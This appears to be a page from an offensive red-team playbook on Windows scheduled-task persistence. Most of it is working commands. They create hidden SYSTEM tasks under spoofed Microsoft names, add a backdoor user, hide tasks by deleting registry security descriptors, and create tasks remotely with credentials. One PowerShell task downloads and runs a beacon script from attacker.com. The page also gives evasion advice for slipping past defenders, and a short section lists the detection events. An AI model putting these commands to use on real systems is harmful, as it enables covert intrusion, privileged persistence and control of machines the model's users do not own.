# Scheduled Task Persistence

> **MITRE ATT&CK**: Persistence / Execution > T1053.005 - Scheduled Task/Job
> **Platforms**: Windows
> **Required Privileges**: User (limited tasks), Admin (SYSTEM-level tasks)
> **OPSEC Risk**: Medium (legitimate mechanism, but task creation is logged)

---

## Strategic Overview

Scheduled tasks are one of the most reliable persistence mechanisms on Windows. They survive reboots, can execute with SYSTEM privileges, support remote creation for lateral movement, and offer flexible trigger conditions (time-based, event-based, logon-based). As a Red Team Lead, the challenge is not in creating the task but in making it blend with the hundreds of legitimate tasks present on any Windows system. Mature defenders enumerate scheduled tasks regularly, and EDR products flag task creation events. The operational approach should involve mimicking legitimate Microsoft task naming conventions, scheduling execution during business hours to blend with normal activity, and using XML imports for tasks that are harder to detect via command-line logging.

## Technical Deep-Dive

### Basic Scheduled Task Creation

```bash
# Create task that runs at logon (user-level)
schtasks /create /tn "Microsoft\Windows\WindowsUpdate\UpdateCheck" /tr "C:\ProgramData\updater.exe" /sc onlogon /ru %USERNAME% /f

# Create task that runs every hour
schtasks /create /tn "SystemHealthCheck" /tr "C:\ProgramData\health.exe" /sc hourly /mo 1 /f

# Create task that runs at specific time daily
schtasks /create /tn "Microsoft\Windows\Maintenance\ConfigRefresh" /tr "powershell.exe -w hidden -f C:\ProgramData\sync.ps1" /sc daily /st 09:30 /f

# Create task running as SYSTEM (requires admin)
schtasks /create /tn "WindowsDefenderUpdate" /tr "C:\ProgramData\defender_update.exe" /sc onstart /ru SYSTEM /f

# Create task with multiple triggers
schtasks /create /tn "TelemetrySync" /tr "C:\ProgramData\telemetry.exe" /sc daily /st 08:00 /du 0012:00 /ri 60 /f
```

### AT Jobs (Legacy)

```bash
# AT command (deprecated but may still work on older systems)
at 09:00 /every:M,T,W,Th,F "C:\ProgramData\payload.exe"
at \\TARGET 14:00 "cmd /c net user backdoor P@ss! /add"
```

### PowerShell Scheduled Task Creation

```powershell
# Create scheduled task with PowerShell (more control over parameters)
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-w hidden -nop -c IEX((New-Object Net.WebClient).DownloadString('https://attacker.com/beacon.ps1'))"
$trigger = New-ScheduledTaskTrigger -AtLogOn
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit (New-TimeSpan -Hours 0)
Register-ScheduledTask -TaskName "Microsoft\Windows\NetTrace\GatherNetworkInfo" -Action $action -Trigger $trigger -Principal $principal -Settings $settings

# Event-based trigger (execute when specific event occurs)
$trigger = New-ScheduledTaskTrigger -AtLogOn
$CIMTrigger = Get-CimClass -ClassName MSFT_TaskEventTrigger -Namespace Root/Microsoft/Windows/TaskScheduler
$EventTrigger = New-CimInstance -CimClass $CIMTrigger -ClientOnly
$EventTrigger.Subscription = '<QueryList><Query Id="0"><Select Path="Security">*[System[EventID=4624]]</Select></Query></QueryList>'
$EventTrigger.Enabled = $true
```

### XML Task Import

XML-based task creation avoids command-line logging of schtasks arguments.

```xml
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Description>Windows Telemetry Collection</Description>
    <Author>Microsoft Corporation</Author>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <Hidden>true</Hidden>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>C:\ProgramData\telemetry.exe</Command>
    </Exec>
  </Actions>
</Task>
```

```bash
# Import task from XML (cleaner command line)
schtasks /create /tn "Microsoft\Windows\Customer Experience Improvement Program\Consolidator" /xml C:\temp\task.xml /f
```

### Hidden Tasks (Security Descriptor Modification)

```powershell
# Delete the SD (security descriptor) registry value to hide task from schtasks /query
# Task files are stored in: C:\Windows\System32\Tasks\
# Registry: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\<TaskName>

# Remove SD value to hide from enumeration tools
$path = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\Microsoft\Windows\UpdateCheck"
Remove-ItemProperty -Path $path -Name "SD" -Force

# The task still executes but is invisible to schtasks /query and Task Scheduler GUI
# Note: This technique was patched in Windows updates (CVE-2022-37981 era)
```

### Remote Scheduled Task Creation

```bash
# Create task on remote system
schtasks /create /s TARGET /u DOMAIN\admin /p Password123 /tn "RemoteTask" /tr "cmd /c whoami > C:\temp\out.txt" /sc once /st 00:00 /f

# Run existing task immediately on remote system
schtasks /run /s TARGET /u DOMAIN\admin /p Password123 /tn "RemoteTask"

# Delete remote task (cleanup)
schtasks /delete /s TARGET /u DOMAIN\admin /p Password123 /tn "RemoteTask" /f
```

```powershell
# PowerShell remote task creation via CIM
$session = New-CimSession -ComputerName TARGET -Credential (Get-Credential)
Register-ScheduledTask -CimSession $session -TaskName "Maintenance" -Action (New-ScheduledTaskAction -Execute "payload.exe") -Trigger (New-ScheduledTaskTrigger -AtLogOn)
```

### GPO-Deployed Scheduled Tasks

```powershell
# If you have GPO modification rights, deploy tasks via Group Policy
# GPO path: Computer Configuration > Preferences > Control Panel Settings > Scheduled Tasks
# This deploys the task to all computers in the OU - very powerful for mass persistence
# XML stored in: \\domain\SYSVOL\domain\Policies\{GUID}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
```

### Stealth Techniques

```
Naming conventions to blend with legitimate tasks:
- Use Microsoft\Windows\<SubFolder>\<TaskName> path structure
- Mimic existing task names: "Consolidator", "GatherNetworkInfo", "UPnPHostConfig"
- Set Author to "Microsoft Corporation" in XML
- Schedule during business hours (09:00-17:00) when user activity masks execution
- Use event-based triggers instead of time-based (harder to predict/monitor)
- Set ExecutionTimeLimit to PT0S (unlimited) to avoid repeated task restarts
```

## Detection & Evasion

### Detection Mechanisms
- **Event ID 4698**: Scheduled task creation (Security log)
- **Event ID 106**: Task registered (TaskScheduler/Operational log)
- **Event ID 200/201**: Task execution started/completed
- **Sysmon Event ID 1**: Process creation from taskeng.exe or taskhostw.exe
- **Task folder enumeration**: C:\Windows\System32\Tasks\ file analysis

### Evasion Techniques
- Import via XML to minimize command-line artifacts
- Remove SD registry value to hide from enumeration
- Use nested folders matching Microsoft naming conventions
- Create task then immediately modify the XML file to alter execution parameters
- Schedule execution at times aligned with legitimate system maintenance windows
- Use COM handler tasks instead of executable actions

### OPSEC Considerations
- Every task creation generates Event ID 4698 -- this cannot be suppressed without log tampering
- Task names in production environments follow patterns; anomalies are noticed
- schtasks.exe command-line arguments are logged and easily searched
- Remote task creation generates authentication events on the target

## Cross-References

- `04-persistence/registry-persistence.md` - Registry-based task cache manipulation
- `09-lateral-movement/` - Remote scheduled task creation for lateral movement
- `03-execution/powershell-execution.md` - PowerShell payloads triggered by tasks
- `06-defense-evasion/` - Log tampering to suppress task creation events

## References

- MITRE T1053.005: https://attack.mitre.org/techniques/T1053/005/
- Scheduled Task Tampering: https://www.microsoft.com/en-us/security/blog/2022/04/12/tarrask-malware-uses-scheduled-tasks-for-defense-evasion/
- SysInternals Autoruns: https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns
- Task Scheduler Reference: https://docs.microsoft.com/en-us/windows/win32/taskschd/task-scheduler-reference
